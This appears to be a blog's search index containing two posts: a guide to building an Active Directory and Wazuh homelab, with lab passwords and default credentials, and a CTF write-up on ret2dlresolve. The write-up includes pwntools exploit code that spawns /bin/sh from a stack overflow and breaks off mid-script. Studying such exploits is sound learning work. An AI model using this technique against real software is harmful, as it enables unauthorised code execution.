
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2025-05-23","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/building_homelab/","summary":"Fresh off my CRTO exam I itched for a local AD lab to practice red-team stuff. GOAD with the ELK/Wazuh extension is (at the time of writing) the best choice (author\u0026rsquo;s personal views) for this but I seriously lacked a gigaton of RAM required for 5 (lab) + 1 (extension) VMs, so I went Thanos mode and declared - Fine! I\u0026rsquo;ll do it myself.","tags":["active directory"],"text":"fresh off my crto exam i itched for a local ad lab to practice red-team stuff. goad with the elk/wazuh extension is (at the time of writing) the best choice (author\u0026rsquo;s personal views) for this but i seriously lacked a gigaton of ram required for 5 (lab) + 1 (extension) vms, so i went thanos mode and declared - fine! i\u0026rsquo;ll do it myself.\nps: i’ve tried goad (v2) without the elk/wazuh stack. it’s a stellar lab that hits a lot of awesome topics. if you haven’t touched it yet, crawl out from under that rock and go check it out.\nmy host device specifications the machine i used to built this lab has\nan amd ryzen 5500u processor - 6 physical (12 logical) cores 32 gigs of ram (which might\u0026rsquo;ve been huge for ancient times, but since the dawn of llms i feel smol and scared.) domain controller fetch windows server image download the windows server 2022 vhd file from here. create a copy of the downloaded file.\nsetup a vm i used virtualbox to create a new vm named lab-dc and imported the downloaded vhd file. i provided the lab with virtualbox host-only network connection, which can be created leveraging the tools \u0026gt; network window.\nboot up the vm and follow the installation steps:\nselect the locale settings. accept the license agreement.\ncreate a password for the administrator account. i used lab@1234$.\nclick on finish. configure vm addons log-in as administrator.\nfrom the toolbar, select add \u0026lsquo;virtualbox guest-addons\u0026rsquo;. install it to improve the vms execution.\nfollow along after the server vm restarts.\nset the server hostname in the server manager application window, navigate to local server from the left pane. click on computer name under properties. further, click on the change button to change server name. click on ok and restart the vm.\nconfigure the static ip address hit win+r and run ncpa.cpl to open network connections under control panel. view the property of the ethernet interface. click on internet protocol version 4 (tcp/ipv4) and select its properties. set the preferred ip address and set the gateway to host\u0026rsquo;s ip address. set the preferred dns same as the ip address of the server. finally, click on ok. install active directory domain services launch server manager. navigate to manage \u0026gt; add roles and features. continue with default installation. continue clicking on next until select server roles. select active directory domain services and click on add features in the window that pops-up. ensuring that active directory doman services is selected, click on next.\ngo forward with default selection in features and ad ds tab by clicking on next.\non the confirmation tab, select the restart the destination server automatically if required if required and click on install.\nonce greeted with following screen, click on the flag icon. under post-deployment configuration section, click on promote this server to a domain controller.\\\ncreate a new forest and set the appropriate name. click on next.\nlet the forest functional level and domain functional level be at default of windows server 2016. keep the default roles for the dc. set the dsrm password. i used labdsrm@1234$ in the dns options menu, just click next. follow through and click next on verify the netbios domain name.\nunder the paths configuration window go with default settings if no changes are needed.\nclick on next under review options window.\nafter prerequisite checks pass, click on install to continue.\nlet the server restart. once the server restarts, log in as \u0026lt;domain\u0026gt;\\administrator using the password of administrator we setup above while installing the vm (here: lab@1234$). creating domain objects creating organizational units (ous) note: one may skip this and directly add users.\nlaunch server manager and navigate to tools \u0026gt; active directory users and computers right-click on the \u0026lt;domain name\u0026gt; (here and hereafter lab.local for us), select new and click on organizational unit. in the dialog bog, provide with an ou name of your choice and click on ok.\nwe can create nested ous by:\nright-click on the ou of choice, navigate to new \u0026gt; organizational unit and follow the process as above. i created two more ous under our lab-ou namely, users and computers, within users i further created two ous - administrators and researchers. (it made for a good practice)\ncreating a user right-click the administrators ou under lab-ou \u0026gt; users, navigate to new \u0026gt; user.\nfill in the name details. click on next.\nset the password details and select any other configuration required (here: admin@1234). click on next. click on finish. practise by creating multiple users.\npromoting a user to domain administrator right-click on the newly created user and navigate to properties. navigate to member of tab. the screen should display the groups this particular user is part of. click on add.... in the select groups window, within the form-field labeled enter the object names to select (examples), enter domain and click on ok. a dialog box with all group names starting with domain should appear, select the domain admins group and click on ok.\nclick on apply, then click on ok.\ncreating a group navigate to the ou of your choice, right-click and select new \u0026gt; group. add details and click on ok. add group members right-click on the newly created group and select properties. open the members tab, click on add.... a select users, contacts, computers, service accounts, or groups window opens up. within the form field under enter the objct names to select (examples) enter the name of target user (click on check names to correct the format). finally, click on ok. click on apply and then click on ok.\ngroup membership of user can be verified by navigating to user\u0026rsquo;s properties \u0026gt; member of.\ncreating a file share create a new folder (here test-share). navigate to properties \u0026gt; sharing from the context-menu of the folder. click on advanced sharing. enable share this folder. configure share name if needed, click on apply and click on ok. visit the dc and the file-share would be visible. configure file-share permissions navigate to properties \u0026gt; security tab from context-menu of the folder/file share. click on edit. next, click on add... in the select users, computers, service accounts, grups window, search and select the entities. click on ok. change the permissions for the entity from the allow/deny list. finally, click on apply and ok respectively. adding a computer to the ad domain a long time ago in a galaxy far, far away microsoft offered windows vm images to test internet-explorer. the files have since been archived across internet. one may grab the version that suits them here all other places of their choice. i am using virtualbox, so it would be a virtualbox image in my case.\ndownload the archive, extract it and import the (here .ova) file in virtualbox (ctrl+i for importing an image). configure the network adapter of new machine to connect to virtualbox host-only adapter (same as the dc).\nlog into the vm (ieuser:passw0rd!). run (win+r) ncpa.cpl to enter network connections window in control panel \u0026gt; network and interent. configure the dns server to dc ip for the ethernet interface by navigating through properties (as above). although the virtualbox host-only adapter would provide this vm with a range in same subnet as dc through dhcp, i will configure a static ip for this machine (for identification purposes in my later projects).\nlaunch settings and go to accounts \u0026gt; access work or school. click on connect. click on join this device to a local active directory domain. enter the domain name in the join a domain window. click on next. enter the username and password of a domain administrator account to authenticate. click on skip. restart the vm.\nlogin using one of the user accounts created earlier. go to control panel \u0026gt; network and interent \u0026gt; network and sharing center to validate you are connected to the domain. the reachability can be established from the command-prompt as follows:\nthe computer would be visible in the computers section under the active directory users and computers. it can be dragged-and-dropped to any ou we created.\ncreate a group policy back on the dc machine, launch the server manager and go to tools \u0026gt; group policy management. one can navigate through different organizational units (ous), and select the one required.\ngroup policy to create a local administrator account right click on the ou with computers, select create a gpo in this domain, and link it here... provide a name for the new group policy object (gpo) and click on ok. right-click on the newly created gpo and select edit. a group policy management editor window pops-up. go to preferences \u0026gt; control panel settings and select local users and groups. right-click on the table (empty here), and select new \u0026gt; local group. within the new local group properties, set the action to be update. select the group name to be administrators (built-in) from the drop-down menu. click on add under members table. click on the ... button beside name to spawn the select user, computer, or group window. enter the object name (here ashtrace, a domain-joned user i created earlier). click on check names to retrieve the particular user name in correct format. click on ok. click on ok again (notice that the user name is prefixed by the domain name.)\nfinally, click on apply and ok respectively.\nvalidate the gpo by going back to group policy management window, navigate to the ou and select the gpo created. visit the settings tab. titles can be expanded through clicks over them, and it can be observed that the gpo updates the membership of the built-in administrators group.\na window-pop with alert from internet-explorer/edge might spawn complaining website trust issues as the setting page renders an html file. go forth and trust the source, by selecting add in the window itself, to render the contents.\nsyncing group policy updates go to the machine added earlier.\neither reboot it, or spawn a command prompt and type gpupdate /force.\nonce update, open up file explorer. right-click on this pc and select manage.\nwithin the computer management window, go to local users and groups. double-click on groups, followed by a double-click on administrators.\nit is evident that lab\\ashtrace is a member of the builtin-administratosr group now, and their credential can be used to exeute task with administrative privileges.\nadd a server to ad lab use the copy of the windows server vhd image we created earlier, to spawn a new vm machine connected to the virtualbox host-only adapter. note: if you get uuid conflict run c:\\users\\ashtrace\\vms\u0026gt;\u0026quot;c:\\program files\\oracle\\virtualbox\\vboxmanage.exe\u0026quot; internalcommands sethduuid \u0026lt;path-to-vhd-file\u0026gt;\nconfigure the locale settings and setup the administrator password (reference the steps executed when preparing vm for the dc i.e. steps 1-2-3-4).\nonce the vm reboots, through the server manager configure a hostname for the vm (reference step 7). i named the server lab-srv.\nafter the vm restarts again, configure a static ip address and enter the dc\u0026rsquo;s ip for dns (reference step 46, use credential setup for lab server to login).\nopen file explorer. right-click on this pc, select properties. this opens up the about page in settings. scroll-down and click on advanced system settings. in the pop-window go to computer name tab and click on change. switch to domain from workgroup and enter the domain name (here: lab.local), enter the domain administrator credentials. after successful authentication a dialog box with message welcome to domain \u0026lt;domain name\u0026gt; should appear. restart the vm when asked. after reboot, use domain credentials to log onto the server. i used the ashtrace account credentials as it would be part of the built-in administrator group owing the gpo created earlier (ensure that the lab-srv machine is part of the ou to which the gpo has been mapped, if not on the dc, open up server manager \u0026gt; go to active directory users and computers from computers drag the lab-srv machine to the particular ou (lab-ou \u0026gt; computers in this case), back on the lab-srv machine run gpupdate /force and reboot) configure iis service on the newly added server we briefly enable a second network adapter for the vm and allow access to the wi-fi network.\nin the server manager application, select to manage \u0026gt; add roles and features. select role-based or feature-based installation mode and click on next. ensure that the server is selected in server selection window.\nselect web server iis in the server roles window and click on add features in the pop-window that appears. click on next.\nclick on next in features window followed by another next. in the web server role (iis) window\u0026rsquo;s role services list select following under application development (if you want asp.net support) along with the default features selected. click on next. under confirmation allow the wizard to restart the vm if needed and click on install.\nonce the installation succeeds, visit the server from the workstation added earlier to establish if the iis service is up and running.\nadding xdr wazuh is an open-source xdr. it ships ova image among other installation methods.\ndownload the ova file and import it in virtualbox.\nchange the network adapter to host-only, change the graphics controller to vmsvga (under settings \u0026gt; display \u0026gt; graphics controller) and enable the enable hardware clock in utc time feature under settings \u0026gt; system \u0026gt; extended features.\npower-up the vm, login using credentials wazuh-user:wazuh.\nsetup static ip address find the name of the ethernet interface using ip a. [wazuh-user@wazuh-server ~]$ ip a 1: lo: \u0026lt;loopback,up,lower_up\u0026gt; mtu 65536 qdisc noqueue state unknown group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host noprefixroute valid_lft forever preferred_lft forever 2: eth0: \u0026lt;broadcast,multicast,up,lower_up\u0026gt; mtu 1500 qdisc fq_codel state up group default qlen 1000 link/ether 08:00:27:bf:d2:7c brd ff:ff:ff:ff:ff:ff altname enp0s17 inet 192.168.56.107/24 brd 192.168.56.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::a00:27ff:febf:d27c/64 scope link proto kernel_ll valid_lft forever preferred_lft forever check the status of the ethernet interface to identify the file being used to manage it from systemd-networkd by running networkctl status \u0026lt;interface-name\u0026gt; (here and hereafter the interface-name is eth0) [wazuh-user@wazuh-server ~]$ networkctl status eth0 ● 2: eth0 link file: /usr/lib/systemd/network/99-default.link network file: /etc/systemd/network/10-cloud-init-eth0.network state: routable (configured) online state: online type: ether path: pci-0000:00:11.0 driver: e1000 vendor: intel corporation model: 82545em gigabit ethernet controller (copper) (pro/1000 mt single port adapter) alternative names: enp0s17 hardware address: 08:00:27:bf:d2:7c (pcs systemtechnik gmbh) mtu: 1500 (min: 46, max: 16110) qdisc: fq_codel ipv6 address generation mode: eui64 number of queues (tx/rx): 1/1 auto negotiation: yes speed: 1gbps duplex: full port: tp address: 192.168.56.107 (dhcp4 via 192.168.56.100) fe80::a00:27ff:febf:d27c activation policy: up required for online: yes dhcp4 client id: iaid:0x62b7eef0/duid dhcp6 client duid: duid-en/vendor:0000ab116c1ecb03a0526b40 check the value of network file attribute (here: /etc/systemd/network/10-cloud-init-eth0.network). create a file with name \u0026lt;words-between-number-and-interface\u0026gt;.disabled (eg: cloud-init.disabled) [wazuh-user@wazuh-server ~]$ sudo touch /etc/cloud/cloud-init.disabled remove the file discovered as value of network file attribute. [wazuh-user@wazuh-server ~]$ sudo rm /etc/systemd/network/10-cloud-init-eth0.network create a new file /etc/systemd/network/10-static.network [match] name=eth0 [network] address=192.168.56.150/24 gateway=192.168.56.1 dns=8.8.8.8 dns=1.1.1.1 restart the systemd-networkd service. sudo systemctl restart systemd-networkd validate the changes through networkctl status eth0. access the wazuh dashboard visit the url through ip address configured earlier (here: https://192.168.56.107) and credential admin:admin. deploy wazuh agents click on agent management \u0026gt; summary from the hamburger menu icon on the top left of the dashboard. for your first agent deploy new agent page should appear, further agents can be added via clicking on deploy new agent button. under select the package to download and install on your system: select windows: msi 32/64 bits. under server address, add the add ip address configured for this wazuh-server vm. skip optional settings, the command under run the following commands to download and install the agent: fetches the installer from packages.wazuh.com thus for the sake of installation enable a second network adapter on the vms and provide access to internet through bridged adapter. log onto the target vm with administrative account (domain administrator on lab-dc and local administrator, for e.g. the one created earlier through gpo, on the workstation and server lab-srv). open a powershell session with administrative privileges. copy the command from run the following commands to download and install the agent: section of the deploy new agent page and run it in the powershell session. after the command is executed run net start wazuhsvc from the same powershell session. through task manager \u0026gt; services it is evident a certian wazuhsvc service was created and is running. after a while the agent would be visible on the agent management \u0026gt; summary dashboard (first as never connected then as active.)\nrepeat the steps to install the agent on other vm machines in the lab.local domain. finally, the agent management \u0026gt; summary should look like this. finally agument this lab setup by adding on other servers and configurations like delegation, pki etc. and do share the guides and resources with me.\neat\nsleep\nhack\nrepeat\nstay hydrated\ntouch grass\nquick troubleshoot the log of wazuh agent can be viewed from the file c:\\program files (x86)\\ossec-agent\\ossec.log ","title":"AD Homelab 101: Building an Active Directory + XDR homelab in 101 steps"},{"date":"2025-01-14","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/how_functions_resolve/","summary":"While going through another one of those easy challenges (this one dealing with ret2dlresolve), I encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction I could not figure out what the exploit actually was. Thus I put on my gloves and decided to dig into the dl_resolve process.","tags":["ctf","linux","pwn","writeup"],"text":"while going through another one of those easy challenges (this one dealing with ret2dlresolve), i encountered the following piece of exploit in the writeup which possessed limited verbosity for me and with this level of abstraction i could not figure out what the exploit actually was. thus i put on my gloves and decided to dig into the dl_resolve process.\nfrom pwn import * elf = context.binary = elf(\u0026#39;./challenge_binary\u0026#39;) p = elf.process() rop = rop(elf) # create a resolver for the system function dlresolve = ret2dlresolvepayload(elf, symbol=\u0026#39;system\u0026#39;, args=[\u0026#39;/bin/sh\u0026#39;]) rop.raw(\u0026#39;a\u0026#39; * 72) # padding rop.read(0, dlresolve.data_addr) # read in the data and structures for the ret2dlresolve rop.ret2dlresolve(dlresolve) # trigger the linker to resolve system p.sendline(rop.chain()) # send the exploit p.sendline(dlresolve.payload) # send the relevant structures p.interactive() ps: no grudges against the author of the writeup or challenge. i am thankful for them to introduce me to a new topic.\ncontext information we are provided with an elf binary. i\u0026rsquo;ve tried my best to redact the challenge name.\nbinary executable security mitigation enumeration arch: amd64-64-little relro: partial relro stack: no canary found nx: nx enabled pie: no pie (0x400000) runpath: b\u0026#39;./glibc/\u0026#39; stripped: no source code analysis functions main\nint __cdecl main(int argc, const char **argv, const char **envp) { vuln(argc, argv, envp); return 0; } vuln\nssize_t vuln() { char buf[64]; // [rsp+0h] [rbp-40h] byref return read(0, buf, 0xc8ull); } vuln() is vulnerable to out-of-bounds write as it tries to read in 200 bytes within a 40 bytes buffer. exploitation avenues as there is not any target win() functions or call to juicy funtions like system(), we need to perform a ret2dlresolve attack to call system() by abusing the dynamic linking process of an elf.\nduring a ret2dlresolve, the attacker tricks the binary into resolving a function of its choice (such as system) into the plt. this then means the attacker can use the plt function as if it was originally part of the binary, bypassing aslr (if present) and requiring no libc leaks.\ndetailed overview of dynamic linking dynamically-linked elf objects import libc functions when they are first called using the plt and got. during the relocation of a runtime symbol, rip will jump to the plt and attempt to resolve the symbol. during this process a \u0026ldquo;resolver\u0026rdquo; is called.\nexample: calling read() in vuln()\nat vuln+25\n0x000000000040113b \u0026lt;+25\u0026gt;: call 0x401030 \u0026lt;read@plt\u0026gt; at read@plt\n0x401030 \u0026lt;read@plt\u0026gt;: jmp qword ptr [rip+0x2fe2] # 0x404018 \u0026lt;read@got.plt\u0026gt; 0x401036 \u0026lt;read@plt+6\u0026gt;: push 0x0 0x40103b \u0026lt;read@plt+11\u0026gt;: jmp 0x401020 first it jumps to read@got.plt, if the function is already linked this location is populated with the address of the target funtion. but on first call it points to the next instruction in the plt.\nat read@got.plt before first call to read\n0x404018 \u0026lt;read@got.plt\u0026gt;: 0x0000000000401036 as evident from above, at 0x401036 we push a byte (here 0x0) called reloc_arg (it is essentially the index of the elf32_rel/elf64_rela in jmprel table, example: read is at index 0) onto stack and jump to a predefined address (here 0x401020) called default stub. the reloc_arg is multiplied by size of elf64_rela (24) to get reloc_offset from the jmprel base address.\nat the stub, we push link_map ,a list with all the loaded libraries, to the stack and jump to an address loaded from start of the got section.\n0x401020: push qword ptr [rip+0x2fe2] # 0x404008 0x401026: jmp qword ptr [rip+0x2fe4] # 0x404010 here 0x404010 is the start of got section. at the start of got section there is a special address that lies within the ld.so\u0026rsquo;s memory range responsible for loading the dynamically linked libc function.\n0x404010: 0x00007ffff7fe8540 0x7ffff7fd3000 0x7ffff7ff3000 0x20000 0x1000 r-xp /challenge/glibc/ld-linux-x86-64.so.2 this leads to a function call of the form: _dl_runtime_resolve (link_map , rel_offset/relog_arg).\n_dl_runtime_resolve uses link_map list to resolve the symbol. after relocating the symbol, it populates the approriate entry in symtab, the initial call of read will be invoked following which the control returns to the instruction after the original call instruction to this funtion within the code, for every subsequent call the got section has been populated thorugh with the address of the function.\n0x404018 \u0026lt;read@got.plt\u0026gt;: 0x00007ffff7ee1780 understanding resolution sections and structures in elf in order to resolve the functions, there are 3 structures that need to exist within the binary. faking these 3 structures could enable us to trick the linker into resolving a function of our choice, and we can also pass parameters in (such as /bin/sh) once resolved.\nreadelf -d challenge_binary tag type name/value 0x0000000000000005 (strtab) 0x400390 0x0000000000000006 (symtab) 0x400330 0x0000000000000017 (jmprel) 0x400430 jmprel (.rel.plt) has an offset r_offset that stores the target got address where to store the resolved address and another index r_sym into the symtab (.dynsym) a symbol table, the structure at this offset has a member st_name which stores offset into strtab (.dynstr), a string table, for symbol name.\njmprel (.rel.plt) the jmprel segment stores the relocation table, which maps each entry to a symbol.\nx86 example elf:\nreadelf -r source relocation section \u0026#39;.rel.dyn\u0026#39; at offset 0x2d0 contains 1 entry: offset info type sym.value sym. name 0804bffc 00000206 r_386_glob_dat 00000000 __gmon_start__ relocation section \u0026#39;.rel.plt\u0026#39; at offset 0x2d8 contains 2 entries: offset info type sym.value sym. name 0804c00c 00000107 r_386_jump_slot 00000000 gets@glibc_2.0 0804c010 00000307 r_386_jump_slot 00000000 __libc_start_main@glibc_2.0 amd64 challenge_binary elf:\nreadelf -r challenge_binary relocation section \u0026#39;.rela.dyn\u0026#39; at offset 0x400 contains 2 entries: offset info type sym. value sym. name + addend 0000004031f0 000200000006 r_x86_64_glob_dat 0000000000000000 __libc_start_main@glibc_2.2.5 + 0 0000004031f8 000300000006 r_x86_64_glob_dat 0000000000000000 __gmon_start__ + 0 relocation section \u0026#39;.rela.plt\u0026#39; at offset 0x430 contains 1 entry: offset info type sym. value sym. name + addend 000000404018 000100000007 r_x86_64_jump_slo 0000000000000000 read@glibc_2.2.5 + 0 ida listing load:0000000000400400 ; elf rela relocation table load:0000000000400400 f0 31 40 00 00 00 00 00 06 00+elf64_rela \u0026lt;4031f0h, 200000006h, 0\u0026gt; ; r_x86_64_glob_dat __libc_start_main load:0000000000400418 f8 31 40 00 00 00 00 00 06 00+elf64_rela \u0026lt;4031f8h, 300000006h, 0\u0026gt; ; r_x86_64_glob_dat __gmon_start__ load:0000000000400430 ; elf jmprel relocation table load:0000000000400430 18 40 40 00 00 00 00 00 07 00+elf64_rela \u0026lt;404018h, 100000007h, 0\u0026gt; ; r_x86_64_jump_slot read load:0000000000400430 00 00 01 00 00 00 00 00 00 00+load ends these entries are of type elf32_rel (in x86 executable) and elf64_rela (in amd64 executable):\nx86\ntypedef uint32_t elf32_addr; typedef uint32_t elf32_word; typedef struct { elf32_addr r_offset; /* address */ elf32_word r_info; /* relocation type and symbol index */ } elf32_rel; /* how to extract and insert information held in the r_info field. */ #define elf32_r_sym(val) ((val) \u0026gt;\u0026gt; 8) #define elf32_r_type(val) ((val) \u0026amp; 0xff) the column name coresponds to our symbol name. the offset is the got entry for our symbol. info stores additional metadata. elf32_r_sym stores the index of the elf32_sym(see symtab section definition below) entry in symtab (symbol table) for the specified symbol.\ndue to value of info (visible in .rel.plt dump) the r_sym of gets is 1 as 0x107 \u0026raquo; 8 = 1.\namd64 (cleaner definition further below)\nusing elf64_addr = uint64_t; using elf64_xword = uint64_t; struct elf64_rela { elf64_addr r_offset; // location (file byte offset, or program virtual addr). elf64_xword r_info; // symbol table index and type of relocation to apply. // these accessors and mutators correspond to the elf64_r_sym, elf64_r_type, // and elf64_r_info macros defined in the elf specification: elf64_word getsymbol() const { return (r_info \u0026gt;\u0026gt; 32); } elf64_word gettype() const { return (elf64_word)(r_info \u0026amp; 0xffffffffl); } void setsymbol(elf64_word s) { setsymbolandtype(s, gettype()); } void settype(elf64_word t) { setsymbolandtype(getsymbol(), t); } void setsymbolandtype(elf64_word s, elf64_word t) { r_info = ((elf64_xword)s \u0026lt;\u0026lt; 32) + (t \u0026amp; 0xffffffffl); } }; the r_sym value of read (in challenge_binary elf) would be 1 (0x000100000007 \u0026raquo; 32).\nthe type r_386_jump_slot and r_x86_64_jump_slot means that the entry is for got section.\neg: ida\u0026rsquo;s listing of jumprel of example amd64 elf.\nload:04005c0 ; elf jmprel relocation table load:04005c0 elf64_rela \u0026lt;404018h, 200000007h, 0\u0026gt; ; r_x86_64_jump_slot write load:04005d8 elf64_rela \u0026lt;404020h, 300000007h, 0\u0026gt; ; r_x86_64_jump_slot strlen load:04005f0 elf64_rela \u0026lt;404028h, 400000007h, 0\u0026gt; ; r_x86_64_jump_slot setbuf load:0400608 elf64_rela \u0026lt;404030h, 500000007h, 0\u0026gt; ; r_x86_64_jump_slot read here the first value is r_offset (offset into got), the second value is r_info, the third value is r_addend (available in another definition of elf64_rela mentioned further below).\nnotice how the second value mentions the offset within the symtab table with the highest-order-byte - 2, 3, 4, 5 while the lowest-order-byte represents type 7 ie. r_x86_64_jump_slot.\ncleaner definition of elf64_rela typedef struct { elf64_addr r_offset; /* 64 bit - address */ elf64_xword r_info; /* 64 bit - relocation type and symbol index */ elf64_sxword r_addend; /* 64 bit - addend */ } elf64_rela; // 24 bytes /* how to extract and insert information held in the r_info field.*/ #define elf64_r_sym(i) ((i) \u0026gt;\u0026gt; 32) #define elf64_r_type(i) ((i) \u0026amp; 0xffffffff) #define elf64_r_info(sym,type) ((((elf64_xword) (sym)) \u0026lt;\u0026lt; 32) + (type)) strtab (.dynstr) strtab is a simple table that stores the strings for symbols name.\nida\u0026rsquo;s listing for strtab for challenge_binary\nload:0000000000400390 ; elf string table load:0000000000400390 00 unk_400390 db 0 ; data xref: load:0000000000400348↑o load:0000000000400390 ; load:0000000000400360↑o load:0000000000400390 ; load:0000000000400378↑o load:0000000000400390 ; load:00000000004003e0↓o load:0000000000400390 ; load:00000000004003f0↓o load:0000000000400391 72 65 61 64 00 aread db \u0026#39;read\u0026#39;,0 ; data xref: load:0000000000400348↑o load:0000000000400396 5f 5f 6c 69 62 63 5f 73 74 61+alibcstartmain db \u0026#39;__libc_start_main\u0026#39;,0 ; data xref: load:0000000000400360↑o load:00000000004003a8 6c 69 62 63 2e 73 6f 2e 36 00 alibcso6 db \u0026#39;libc.so.6\u0026#39;,0 ; data xref: load:00000000004003e0↓o load:00000000004003b2 47 4c 49 42 43 5f 32 2e 32 2e+aglibc225 db \u0026#39;glibc_2.2.5\u0026#39;,0 ; data xref: load:00000000004003f0↓o load:00000000004003be 2e 2f 67 6c 69 62 63 2f 00 aglibc db \u0026#39;./glibc/\u0026#39;,0 load:00000000004003c7 5f 5f 67 6d 6f 6e 5f 73 74 61+agmonstart db \u0026#39;__gmon_start__\u0026#39;,0 ; data xref: load:0000000000400378↑o symtab (.dynsym) this table holds relevant symbol information.\nx86 each entry is a elf32_sym structure and its size is 16 bytes.\ntypedef struct { elf32_word st_name ; /* symbol name (string tbl index) -4b*/ elf32_addr st_value ; /* symbol value -4b*/ elf32_word st_size ; /* symbol size -4b*/ unsigned char st_info ; /* symbol type and binding-1b */ unsigned char st_other ; /* symbol visibility under glibc\u0026gt;=2.2 -1b */ elf32_section st_shndx ; /* section index -2b*/ } elf32_sym; amd64 contains a symbol table using elf64_sym structures. every structure associates a symbolic name with a piece of code elsewhere in the binary.\ntypedef struct { elf64_word st_name; /* 32bit - symbol name (string tbl index) */ unsigned char st_info; /* symbol type and binding */ unsigned char st_other; /* symbol visibility */ elf64_section st_shndx; /* 16 bits - section index */ elf64_addr st_value; /* 64 bits - symbol value */ elf64_xword st_size; /* 64 bits - symbol size */ } elf64_sym; // 24 bytes st_name: it acts as a string table index. it will be used to locate the right string in the strtab section.\nst_info: symbol’s type and binding attributes.\nst_other: symbol’s visibility.\nst_shndx: the relevant section header table index.\nst_value: the value of the associated symbol.\nst_size: the symbol’s size. if the symbol has no size or the size is unknown, it contains 0.\nida listing challenge_binary\nload:0000000000400330 ; elf symbol table load:0000000000400330 00 00 00 00 00 00 00 00 00 00+elf64_sym \u0026lt;0\u0026gt; load:0000000000400348 01 00 00 00 12 00 00 00 00 00+elf64_sym \u0026lt;offset aread - offset unk_400390, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; load:0000000000400360 06 00 00 00 12 00 00 00 00 00+elf64_sym \u0026lt;offset alibcstartmain - offset unk_400390, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; load:0000000000400378 37 00 00 00 20 00 00 00 00 00+elf64_sym \u0026lt;offset agmonstart - offset unk_400390, 20h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__gmon_start__ ida listing example binary\nload:04003d8 ; elf symbol table load:04003d8 elf64_sym \u0026lt;0\u0026gt; load:04003f0 elf64_sym \u0026lt;offset alibcstartmain - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;__libc_start_main\u0026#34; load:0400408 elf64_sym \u0026lt;offset awrite - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;write\u0026#34; load:0400420 elf64_sym \u0026lt;offset astrlen - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;strlen\u0026#34; load:0400438 elf64_sym \u0026lt;offset asetbuf - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;setbuf\u0026#34; load:0400450 elf64_sym \u0026lt;offset aread - offset unk_4004b0, 12h, 0, 0, 0, 0\u0026gt; ; \u0026#34;read\u0026#34; the most important value here is st_name as this gives the offset in strtab of the symbol name. the other fields are not relevant to the exploit itself.\njmprel, symtab and strtab for challenge_binary elf base section addresses\nreadelf -d challenge_binary tag type name/value 0x0000000000000005 (strtab) 0x400390 0x0000000000000006 (symtab) 0x400330 0x0000000000000017 (jmprel) 0x400430 jmprel entry for read\n(gdb) x/2gx 0x0000000000400430 + 0 0x400430: 0x0000000000404018 0x0000000100000007 |__ r_offset |___ r_info r_sym = (r_info \u0026raquo; 32) = 1\nsymtab at index 1\nx/6wx 0x400330 + 1 * 24 0x400348: 0x00000001 0x00000012 0x00000000 0x00000000 0x400358: 0x00000000 0x00000000 symtab base + index * size of elf64_sym st_name = 1 strtab at index 1\nx/s 0x0000000000400390 + 0x00000001 0x400391: \u0026#34;read\u0026#34; tl;dr function resolution pseudocode exmaple: calling read in x86 elf\n_dl_runtime_resolve(link_map, reloc_arg) { uintptr_t reloc_offset = reloc_arg * sizeof(elf64_rela); // reloc_arg is pushed in .plt section elf64_rela * rel_entry = jmprel + reloc_offset ; elf64_sym * sym_entry = \u0026amp;symtab[elf64_r_sym(rel_entry-\u0026gt;r_info)]; char * sym_name = strtab + sym_entry-\u0026gt;st_name ; _search_for_symbol_(link_map, sym_name); // invoke initial read call now that symbol is resolved read(0, buf, 0x100); } ret2dlresolve use .bss section to create fake entries, it is closer to the elf in memory compared to the stack.\nstep 1 we need to fake an elf64_rela structure and an elf64_sym structure with following characteristics\nfake elf64_rela (jmprel/.rel.plt) structure it must have a writeable r_offset area where _dl_runtime_resolve will write the address of system(). in the r_info attribute the lower 4 bytes (32 bits) must be equal to 7 ie. r_x86_64_jump_slot, while the higher 4 bytes should be constructed such that (r_info \u0026gt;\u0026gt; 32) * 24 (r_sym value * size of elf64_sym as r_sym is just index) when added to symtab address, points to fake elf64_sym. fake elf64_sym (symtab/.dynsym) structure the st_name value when added to strtab (.dynstr) address points to \u0026lsquo;system\u0026rsquo; string. step 2 with the fake structures in place, we calculate reloc_arg (offset usually pushed in a functions\u0026rsquo;s .plt section) from jmprel (.rel.plt) address to point to our fake elf64_rela structure.\nnext, we push the fake value of reloc_arg onto stack and transfer control to default stub at the start of .plt section to let dl_resolve do its magic.\ncrafting exploit as .bss section is writable at runtime, we use this space to create our fake structures.\nnote: make sure that index to fake .dynsym entry must be multiple of 24. if on dividing the address difference between our fake entry and symtab base we get a fraction this leads to variance in resultant address when recalculated by _dl_fixup during resolution as only the integer part would be stored in r_info as index.\nimport pwn #pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challenge_binary\u0026#34; elf = pwn.context.binary = pwn.elf(exe, checksec = false) rop = pwn.rop(elf) #proc = pwn.process(\u0026#34;./challenge_binary\u0026#34;) #proc = pwn.gdb.debug(\u0026#34;./challenge_binary\u0026#34;, gdbscript = \u0026#34;\u0026#34;\u0026#34; # b *0x000000000040113b # c # \u0026#34;\u0026#34;\u0026#34;) # important addresses plt_stub = elf.get_section_by_name(\u0026#34;.plt\u0026#34;)[\u0026#34;sh_addr\u0026#34;] bss = elf.get_section_by_name(\u0026#34;.bss\u0026#34;)[\u0026#34;sh_addr\u0026#34;] print(f\u0026#34;[*] .plt default stub at: {hex(plt_stub)}\u0026#34;) print(f\u0026#34;[*] .bss at: {hex(bss)}\u0026#34;) strtab, symtab, jmprel = map(elf.dynamic_value_by_tag, [\u0026#34;dt_strtab\u0026#34;, \u0026#34;dt_symtab\u0026#34;, 